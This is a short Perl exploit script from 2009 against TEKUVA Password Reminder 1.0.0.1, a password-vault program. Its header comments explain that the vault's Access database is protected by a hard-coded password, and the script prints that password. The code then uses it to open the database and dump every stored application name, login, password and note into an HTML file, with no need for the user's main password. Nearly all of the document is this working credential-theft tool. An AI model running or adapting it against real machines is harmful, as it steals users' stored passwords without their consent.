#!/usr/bin/perl

# Exploit: TEKUVA Password Reminder Authentication Bypass
# Date: [11/19/2009]
# Author: iqlusion [x+nospam@iqlusion.net]
# Software Link: http://download.cnet.com/Password-Reminder/3000-2064_4-10966598.html
# Version: 1.0.0.1

# Info: TEKUVA Password Reminder is a password vault that allows you to store all
#       your credentials in one spot and all you have to remember is a single 'main'
#       password to access your vault. Unfortunately, the vault is actually an 
#       Access 2007 database that is protected by a password which is hard coded into
#       the program, not your main password.
#
#       This script connects to the database using the hard coded db password and dumps
#       everything into an HTML table, bypassing the need to enter the main vault
#       password (or use the program at all for that matter). Modify values as needed.

# Greetz: quetzal : w00tb0t : sck

use DBI;

$DBFile  = "C:\\Program Files\\TEKUVA\\Password_Reminder\\dtb\\rem.accdb";
$sql = "SELECT app,lgn,pwd,nts FROM pwdrem WHERE idn IS NOT NULL";

$DSN = "DRIVER=Microsoft Access Driver (*.mdb, *.accdb);dbq=$DBFile;pwd=P\@z19r1m";
$dbh = DBI->connect("dbi:ODBC:$DSN")||die print $DBI::errstr;
$dbh->{LongReadLen}=9001;
$qry = $dbh->prepare($sql);
$qry->execute;

open(PWD,">results.html") || die print $!;
print PWD "<table border=1><thead><tr><td>Application/URL</td><td>Login</td><td>Password</td><td>Notes:</td></tr></thead>\n";
while(my($app,$lgn,$pwd,$nts) = $qry->fetchrow_array()){print PWD "<tr><td>$app</td><td>$lgn</td><td>$pwd</td><td>$nts</td></tr>\n";}
print PWD "</table></html>";
print "Passwords dumped to results.html\n\n";